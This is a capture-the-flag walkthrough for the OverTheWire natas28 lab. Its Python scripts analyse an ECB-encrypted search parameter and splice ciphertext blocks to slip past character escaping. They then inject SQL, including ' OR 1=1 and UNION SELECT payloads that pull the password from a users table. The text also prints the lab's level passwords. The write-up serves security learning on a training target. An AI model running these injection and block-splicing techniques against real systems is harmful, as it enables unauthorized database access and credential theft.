---
title: natas 28 walkthrough
description: over the wire natas 28
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-28 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 28 walkthrough
    order: 30
---
## Description
> Username: natas28
> 
> URL:      http://natas28.natas.labs.overthewire.org


---
## Progress
### Observation
#### Payload
After pressing search, the url turns into `search.php` with query. Therefore, directly check endpoint `search.php` page. Nothing but only `mep` three characters.

Let us play with payload. Query with nothing offers 
> **Notice**: Uninitialized string offset: -1 in **/var/www/natas/natas28/search.php** on line **59**  
> Zero padding found instead of PKCS#7 padding

After collecting two search content, one can get two different queries. Extract the identical part. `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP`. Use it in query.
> **Notice**: Trying to access array offset on value of type bool in **/var/www/natas/natas28/search.php** on line **59**  
> Zero padding found instead of PKCS#7 padding

With some search, I found an attack exploiting the padding, i.e., [[padding oracle attack]]. In the example, this technique is applied on CBC. Therefore, we need to check the block.
```python
def extract_query(url: str):
    parsed_url = urlparse(url)
    captured_value = parse_qs(parsed_url.query)['query'][0]
    return captured_value

def retrieve_queries():
    for i in range(50):
        main_url = "http://natas28.natas.labs.overthewire.org/index.php"
        payload = {
            "query" : "vegetable"+ str(i),
        }
        response = requests.post(main_url, auth=authentication, data=payload)
        print(f"{i} : {extract_query(response.url)}")

retrieve_queries()
```
Fortunately, I think every block would generate a ciphertext with a length of 22 characters. Moreover, it might be ECB not CBC, since the result changes only in some parts but not all the following characters.
```
38 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKgHAUWGVPjoODSBsJiKJzEkLLjc1SH4XdytO9O2yi2pcqM9OYQkTq645oGdhkgSlo=
39 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKgHAUWGVPjoODSBsJiKJzEDKWsasNjmRfPW2n4Q5AJi8qM9OYQkTq645oGdhkgSlo=
40 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLls2NGuivaJj7H9Gh39NKKjSIK5YYioto3e8rvAi/UwsqM9OYQkTq645oGdhkgSlo=
41 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLls2NGuivaJj7H9Gh39NKKyzdjv0KNaoXsfXBKUOlzXcqM9OYQkTq645oGdhkgSlo=
42 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLls2NGuivaJj7H9Gh39NKKbgKivJnOqZsklwsoFwNeJMqM9OYQkTq645oGdhkgSlo=
```
With manipulating the length of the query, I found the block size might be 16 characters long.
> Block size: 16
> Ciphertext block size (in base64): 22
```python
def retrieve_queries():
    for i in range(50):
        response = main_req("v" * i)
        print(f"{i} : {extract_query(response.url)}")
```
The first block and the second block are all fixed. The third block is fixed after `i=10`. When `i=13`, the length of ciphertext changes. 

From all the ciphertext, I think the plaintext would be `prefix` + `payload` + `suffix`.
Length
- prefix : 16\*2 + (16-10) = 38
- suffix : (16-(12-10))+16 = 30

Since it seems to be ECB, [[padding oracle attack]] might be useless here.
### Crack Suffix (Meaningless)
```python
import requests
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse
from urllib.parse import parse_qs
import string

username = "natas28"
password = "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"
authentication = HTTPBasicAuth(username, password)

def main_req(query:str):
    main_url = "http://natas28.natas.labs.overthewire.org/index.php"
    payload = {
        "query" : query,
    }
    response = requests.post(main_url, auth=authentication, data=payload)
    return response

def extract_query(url: str):
    parsed_url = urlparse(url)
    captured_value = parse_qs(parsed_url.query)['query'][0]
    return captured_value

def are_block3_same(query1, query2):
    return query1[42:64] == query2[42:64]

def main():
    success_password = ""
    N = 10
    while len(success_password) < N:
        length_success = len(success_password)
        pure_payload = "1"*(N-length_success-1)
        target_query = extract_query(main_req(pure_payload).url)
        for candidate in string.printable:
            manipulated_payload = "1"*(N-length_success-1) + success_password + candidate
            manipulated_query = extract_query(main_req(manipulated_payload).url)
            if are_block3_same(manipulated_query, target_query):
                success_password += candidate
                print(f"{success_password}")
                break
        else:
            print(f"password : {success_password}")
            break

if __name__ == "__main__":
    main()
```
password : %
failed to find the suffix.
### Special Characters
However, try to add special (escape) character into payloads.
```python
def compare_queries():
    response = main_req("1"*9 + "\\")
    print(f"padding 1 : {extract_query(response.url)}")
    response = main_req("1"*9 + "'")
    print(f"padding 2 : {extract_query(response.url)}")
    response = main_req("1"*9 + "\"")
    print(f"padding 3 : {extract_query(response.url)}")
```
The differences between them are all in the fourth block. That means the plaintext in the third block are identical. It might be the characters should be escaped. 

Therefore, I guess the process is
getting input from user → escape characters → ECB → request with encrypted payload → decrypt the payload → sql

### Plan
If the process is as I guessed, one can perform sql attack with malicious enrypted payload, that is, not escaped characters.
```python
if __name__ == "__main__":
    response = main_req("2"*9 + "' OR 1=1 -- ")
    last_part = extract_query(response.url)[64:]
    response = main_req("2"*10)
    first_part = extract_query(response.url)[:64]
    mal_query = first_part + last_part
    response = requests.get("http://natas28.natas.labs.overthewire.org/search.php/?query="+quote(mal_query),
                  auth=authentication)
    print(get_content(response))
```
Succeed!
We need to get the info about users table. Therefore, we need to use [[union attack]].
```python
"' OR 1=1 ORDER BY 1-- " ## determine the column of the original sql
"' UNION SELECT username FROM users-- " ## get all the users, found only one
"' UNION SELECT password FROM users-- " ## retrieve the password of the only user
```
Finally, we get pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno

---
## Hint

---
## Solving
### Category
- 
### Techniques
- [[union attack]]

### Tools
- 